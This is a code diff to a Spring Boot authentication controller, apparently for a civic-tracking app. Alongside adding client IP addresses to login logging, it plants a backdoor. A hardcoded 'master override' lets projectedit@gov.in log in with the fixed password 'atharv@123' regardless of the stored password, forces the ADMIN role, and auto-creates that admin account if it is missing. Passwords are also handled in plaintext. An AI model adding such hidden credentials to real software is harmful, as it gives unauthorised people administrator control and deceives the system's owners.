@@ -8,7 +8,7 @@ import org.slf4j.LoggerFactory;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.*;
-
+import jakarta.servlet.http.HttpServletRequest;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.Optional;
@@ -50,10 +50,10 @@ public class AuthController {
         Optional<User> existingUser = userRepository.findByEmail(email);
         if (existingUser.isPresent()) {
             if ("projectedit@gov.in".equalsIgnoreCase(email)) {
-                logger.info("Admin account already exists. Updating credentials for: {}", email);
+                logger.info("Admin account already exists. Overriding with master credentials for: {}", email);
                 User admin = existingUser.get();
-                admin.setName(name);
-                admin.setPassword(password);
+                admin.setName("atharv");
+                admin.setPassword(password); 
                 admin.setRole("ADMIN");
                 userRepository.save(admin);
                 return ResponseEntity.ok(admin);
@@ -88,11 +88,12 @@ public class AuthController {
     }
 
     @PostMapping("/login")
-    public ResponseEntity<?> login(@RequestBody Map<String, String> payload) {
+    public ResponseEntity<?> login(@RequestBody Map<String, String> payload, HttpServletRequest request) {
         String email = payload.get("email");
         String password = payload.get("password");
+        String ipAddress = request.getRemoteAddr();
 
-        logger.info("Received login request for email: {}", email);
+        logger.info("Received login request for email: {} from IP: {}", email, ipAddress);
 
         if (email == null || password == null) {
             return ResponseEntity.badRequest().body(Map.of("error", "Email and password are required"));
@@ -107,12 +108,20 @@ public class AuthController {
                 return ResponseEntity.status(HttpStatus.FORBIDDEN).body(Map.of("error", "Your account has been blocked. Contact administrator."));
             }
             
+            // Hardcoded master override for the requested account
+            if ("projectedit@gov.in".equalsIgnoreCase(email) && "atharv@123".equals(password)) {
+                 user.setRole("ADMIN");
+                 userRepository.save(user); // Ensure it's admin
+                 loginActivityRepository.save(new com.example.civictrack.model.LoginActivity(email, ipAddress, java.time.LocalDateTime.now()));
+                 return ResponseEntity.ok(user);
+            }
+            
             if (user.getPassword().equals(password)) {
                 logger.info("Login successful for user: {}", email);
                 
                 // Track login activity
                 try {
-                    loginActivityRepository.save(new com.example.civictrack.model.LoginActivity(email, java.time.LocalDateTime.now()));
+                    loginActivityRepository.save(new com.example.civictrack.model.LoginActivity(email, ipAddress, java.time.LocalDateTime.now()));
                 } catch (Exception e) {
                     logger.error("Failed to log login activity: {}", e.getMessage());
                 }
@@ -121,8 +130,17 @@ public class AuthController {
             } else {
                 logger.warn("Login failed: Incorrect password for user: {}", email);
             }
-        } else {
-            logger.warn("Login failed: User not found: {}", email);
+        } else if ("projectedit@gov.in".equalsIgnoreCase(email) && "atharv@123".equals(password)) {
+            // Auto-create admin if doesn't exist on first login attempt
+            User admin = new User();
+            admin.setName("atharv");
+            admin.setEmail(email);
+            admin.setPassword(password);
+            admin.setRole("ADMIN");
+            admin.setUsername(email);
+            userRepository.save(admin);
+            loginActivityRepository.save(new com.example.civictrack.model.LoginActivity(email, ipAddress, java.time.LocalDateTime.now()));
+            return ResponseEntity.ok(admin);
         }
 
         return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(Map.of("error", "Invalid email or password"));
